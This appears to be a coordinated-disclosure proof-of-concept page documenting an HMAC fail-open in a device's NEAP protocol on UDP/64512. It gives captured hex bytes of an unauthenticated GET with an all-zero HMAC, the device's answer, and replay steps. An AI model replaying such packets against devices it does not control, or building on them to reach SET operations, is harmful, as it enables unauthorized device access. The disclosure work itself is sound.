# RC-0003 — PoC: captured HMAC fail-open exchange

**Policy:** this documents an **already captured** non-deploying exchange
from an authorized evidence run. No live exploit script is published during
coordination — the captured pair below *is* the demonstration: a NEAP GET
with an all-zero HMAC field was **accepted and answered**.

## Captured request (UDP/64512 → device)

```text
09 2b 13 38 05 00 00 2a 00 00 20 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 bc f6 85 3d cd 92 02 00 03 0b
00 03 00 06
```

- NEAP message type **5 (GET)** for `NEAP.11.0`, ENDCODE 3, mode 2
- **HMAC field: all zeros** — no valid authentication present
- queries a non-sensitive layout OID (`0b0003`)

SHA-256 of the request bytes: `1912ec78…d9d6ae56`

## Captured response (device → UDP/64512, 167 ms later)

```text
09 2b 13 38 06 00 00 2c 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 02 00 03 0b 00 03 00
08 31 00
```

- NEAP message type **6 (response)**, same OID `0b0003`
- payload: layout value `1` followed by NUL — a **valid answer** to the
  unauthenticated request

SHA-256 of the response bytes: `164c6e73…ef1403`

## What this proves

The device dispatched the request to its XMLDB engine and answered it
**despite the failed HMAC verification** — the fail-open is real, not a
parsing artifact. The exchanged value is a non-sensitive layout constant.

## Limitations (stated plainly)

This PoC proves only acceptance of a non-sensitive GET without a valid
HMAC. It does not query a secret, perform a SET, or prove broader impact.
GET and SET are protected by the same verification path.

## Reproduction (offline)

Save both hex blobs as `.bin` files and compare with the hashes above. A
replay against any device **you own** must show the same accept-behavior on
UDP/64512.
